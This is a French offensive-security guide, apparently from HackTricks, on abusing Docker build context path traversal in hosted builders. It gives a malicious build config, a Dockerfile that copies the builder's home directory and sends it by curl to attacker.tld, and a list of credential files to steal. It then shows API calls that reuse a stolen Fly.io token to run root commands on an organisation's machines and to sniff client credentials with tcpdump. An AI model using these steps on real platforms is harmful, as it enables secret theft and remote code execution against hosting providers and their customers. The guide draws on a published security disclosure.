# Abuser le Docker Build Context dans des hosted builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Si une plateforme CI/CD ou un hosted builder permet aux contributeurs de spécifier le chemin du Docker build context et le chemin du Dockerfile, vous pouvez souvent définir le contexte sur un répertoire parent (par ex., "..") et inclure des fichiers de l'hôte dans le build context. Ensuite, un Dockerfile contrôlé par l'attaquant peut COPY et exfiltrate des secrets trouvés dans le répertoire home de l'utilisateur du builder (par exemple, ~/.docker/config.json). Des registry tokens volés peuvent aussi fonctionner contre les control-plane APIs du provider, permettant un RCE à l'échelle de l'organisation.

## Surface d'attaque

Beaucoup de services hosted builder/registry font à peu près ceci lors de la construction d'images soumises par des utilisateurs :
- Lire une config au niveau du repo qui inclut :
- build context path (envoyé au Docker daemon)
- Dockerfile path relative à ce contexte
- Copier le répertoire du build context indiqué et le Dockerfile vers le Docker daemon
- Builder l'image et l'exécuter comme service hébergé

Si la plateforme ne canonicalise pas et ne restreint pas le build context, un utilisateur peut le définir vers un emplacement en dehors du repository (path traversal), ce qui fait que des fichiers arbitraires de l'hôte lisibles par l'utilisateur de build deviennent partie du build context et sont disponibles pour COPY dans le Dockerfile.

Contraintes pratiques couramment observées :
- Le Dockerfile doit se trouver à l'intérieur du chemin de contexte choisi et son chemin doit être connu à l'avance.
- L'utilisateur de build doit avoir un accès en lecture aux fichiers inclus dans le contexte ; des fichiers de périphérique spéciaux peuvent casser la copie.

## PoC: Path traversal via Docker build context

Exemple de config serveur malveillante déclarant un Dockerfile à l'intérieur du contexte du répertoire parent :
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Remarques :
- L'utilisation de ".." résout souvent vers le répertoire home de l'utilisateur builder (e.g., /home/builder), qui contient typiquement des fichiers sensibles.
- Placez votre Dockerfile sous le nom du répertoire du repo (e.g., repo "test" → test/Dockerfile) afin qu'il reste dans le contexte parent étendu.

## PoC : Dockerfile pour ingérer et exfiltrer le contexte de l'hôte
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Cibles couramment récupérées depuis $HOME :
- ~/.docker/config.json (registry auths/tokens)
- Autres caches et configs cloud/CLI (par ex., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Astuce : Même avec un .dockerignore dans le dépôt, la sélection du contexte côté plateforme vulnérable détermine toujours ce qui est envoyé au daemon. Si la plateforme copie le chemin choisi vers le daemon avant d'évaluer le .dockerignore de votre repo, des fichiers hôtes peuvent quand même être exposés.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Certaines plateformes émettent un seul bearer token utilisable à la fois pour le container registry et l'control-plane API. Si vous exfiltrez un registry token, essayez-le contre l'API du provider.

Exemples d'appels API contre Fly.io Machines API en utilisant le token volé depuis ~/.docker/config.json :

Énumérer les apps dans une org :
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Exécuter une commande en tant que root à l'intérieur de n'importe quelle machine d'une application :
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Résultat : remote code execution à l'échelle de l'organisation sur toutes les apps hébergées lorsque le token dispose de privilèges suffisants.

## Vol de secrets depuis des services hébergés compromis

Avec exec/RCE sur les serveurs hébergés, vous pouvez harvest client-supplied secrets (API keys, tokens) ou lancer des prompt-injection attacks. Exemple : installez tcpdump et capturez le trafic HTTP sur le port 8080 pour extraire les inbound credentials.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Les requêtes capturées contiennent souvent des client credentials dans les headers, bodies, ou query params.

## References

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
